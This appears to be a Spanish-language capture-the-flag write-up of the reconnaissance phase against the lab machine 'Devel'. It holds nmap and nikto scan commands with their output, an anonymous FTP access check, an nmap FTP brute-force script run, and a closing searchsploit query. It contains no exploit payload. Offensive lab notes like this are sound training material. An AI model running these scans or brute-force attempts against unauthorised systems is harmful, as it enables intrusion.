	DEVEL	10.10.10.5

+++++ INFORMACION ENTREGADA:++++++++++++++++++++++++++++++++++++++++++++++++++++
	Nombre: Devel
	Sistema Operativo: Windows
	Dificultad: Facil.
	IP: 10.10.10.5


+++++ RECOLECION DE INFORMACION: ++++++++++++++++++++++++++++++++++++++++++++++++

-- PUERTOS:

	nmap -p- -Pn 10.10.10.5

	nmap -sC -sV -O -p21,80 10.10.10.5 -o nmapTCP.txt

	PORT   STATE SERVICE VERSION
	21/tcp open  ftp     Microsoft ftpd
	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
	| 03-18-17  01:06AM       <DIR>          aspnet_client
	| 03-17-17  04:37PM                  689 iisstart.htm
	|_03-17-17  04:37PM               184946 welcome.png
	| ftp-syst:
	|_  SYST: Windows_NT

	80/tcp open  http    Microsoft IIS httpd 7.5
	| http-methods:
	|_  Potentially risky methods: TRACE
	|_http-server-header: Microsoft-IIS/7.5
	|_http-title: IIS7
	Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
	Device type: general purpose|phone|specialized
	Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
	OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012:r2
	Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%)
	No exact OS matches for host (test conditions non-ideal).
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

	nmap -sU 10.10.10.5 -o nmapUDP.txt

	No hay puertos UDP abiertos.

----- RESUMEN DE LA INFORMACION OBTENIDA:---------------------------------------

	Puerto 21	Protocolo:TCP	Servicio:ftp	Version: Microsoft ftpd
	Puerto 80	Protocolo:TCP	Servicio:html	Version: Microsoft IIS httpd 7.5  x-aspnet-version header: 2.0.50727


+++++ FASE DE ANALISIS DE VULNERAVILIDADES: ++++++++++++++++++++++++++++++++++++

----- FTP: Conexion ftp por el puerto 21 -----

	*Prueba de acceso con usuarios anonymous y nada en password.
	Se consigue acceso y muestra solo los siguientes ficheros/directorio.

	| 03-18-17  01:06AM       <DIR>          aspnet_client
	| 03-17-17  04:37PM                  689 iisstart.htm
	|_03-17-17  04:37PM               184946 welcome.png
	
	*Nota con esta opcion podemos subir o bajar archivos.

-- Ejecutar SCRIPT de la herramienta Nmap: 

	nmap --script=*ftp* -p21 10.10.10.5 (Tarda varios minutos, ya que incluye un script de fuerza bruta).
	
	Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-03 10:25 EDT
	NSE: [ftp-bounce] PORT response: 501 Server cannot accept argument.
	NSE: [ftp-brute] usernames: Time limit 10m00s exceeded.
	NSE: [ftp-brute] usernames: Time limit 10m00s exceeded.
	NSE: [ftp-brute] passwords: Time limit 10m00s exceeded.
	Nmap scan report for 10.10.10.5
	Host is up (0.044s latency).

	PORT   STATE SERVICE
	21/tcp open  ftp
	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
	| 03-18-17  02:06AM       <DIR>          aspnet_client
	| 03-17-17  05:37PM                  689 iisstart.htm
	|_03-17-17  05:37PM               184946 welcome.png
	| ftp-brute: 
	|   Accounts: No valid accounts found
	|_  Statistics: Performed 39531 guesses in 600 seconds, average tps: 66.1
	| ftp-syst: 
	|_  SYST: Windows_NT

	Nmap done: 1 IP address (1 host up) scanned in 600.37 seconds


----- HTTP: Conexion http por el puerto 80 -----

-- Ejecuto la aplicación NIKTO, por el puerto 80.

	nikto -h 10.10.10.5 -p80 >nikto.txt

	- Nikto v2.1.6
	---------------------------------------------------------------------------
	+ Target IP:          10.10.10.5
	+ Target Hostname:    10.10.10.5
	+ Target Port:        80
	+ Start Time:         2020-03-01 05:40:29 (GMT-5)
	---------------------------------------------------------------------------
	+ Server: Microsoft-IIS/7.5
	+ Retrieved x-powered-by header: ASP.NET
	+ The anti-clickjacking X-Frame-Options header is not present.
	+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
	+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
	+ Retrieved x-aspnet-version header: 2.0.50727
	+ No CGI Directories found (use '-C all' to force check all possible dirs)
	+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
	+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
	+ /: Appears to be a default IIS 7 install.
	+ 7863 requests: 0 error(s) and 8 item(s) reported on remote host
	+ End Time:           2020-03-01 05:46:12 (GMT-5) (343 seconds)
	---------------------------------------------------------------------------
	+ 1 host(s) tested

-- Buscar con searchsploit "IIS 7.5" 
	# searchsploit IIS 7.5

